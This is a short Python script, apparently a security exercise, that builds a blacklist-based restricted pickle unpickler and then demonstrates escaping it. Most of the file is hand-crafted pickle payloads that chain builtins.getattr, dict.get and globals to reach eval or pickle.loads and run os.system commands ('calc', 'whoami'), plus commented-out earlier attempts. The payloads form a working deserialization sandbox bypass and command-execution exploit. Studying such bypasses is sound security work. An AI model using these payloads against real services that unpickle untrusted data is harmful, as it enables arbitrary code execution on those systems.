#!/usr/bin/env python
# -*- coding: utf-8 -*-
# @Time    : 2022/10/16 17:15
# @Author  : lockcy
# @File    : pickle_bypass_findclass.py

import builtins
import io
import pickle

blacklist = {'eval', 'exec', 'execfile', 'compile', 'open', 'input', '__import__', 'exit'}


class RestrictedUnpickler(pickle.Unpickler):

    def find_class(self, module, name):
        # Only allow safe classes from builtins.
        if module == "builtins" and name not in blacklist:
            return getattr(builtins, name)
        # Forbid everything else.
        raise pickle.UnpicklingError("global '%s.%s' is forbidden" %
                                     (module, name))


def restricted_loads(s):
    """Helper function analogous to pickle.loads()."""
    return RestrictedUnpickler(io.BytesIO(s)).load()


if __name__ == '__main__':
    # restricted_loads(b"cos\nsystem\n(S'echo hello world'\ntR.")
    # restricted_loads(b'cbuiltins\neval\n(S\'getattr(__import__("os"), "system")("echo hello world")\'\ntR.')
    evil = b'cbuiltins\ngetattr\n(cbuiltins\ngetattr\n(cbuiltins\ndict\nS"get"\ntR' \
             b'(cbuiltins\nglobals\n)RS"__builtins__"\ntRS"eval"\ntR(S"__import__("os").system("calc")"\ntR.'
    evil = b'\x80\x03cbuiltins\ngetattr\n(cbuiltins\ngetattr\ncbuiltins\ndict\nX' \
           b'\x03\x00\x00\x00get\x86R(cbuiltins\nglobals\n)RS"pickle"\ntRS"loads"\ntRC\x19cos\nsystem\n(S"whoami"\ntR.\x85R.'

    restricted_loads(evil)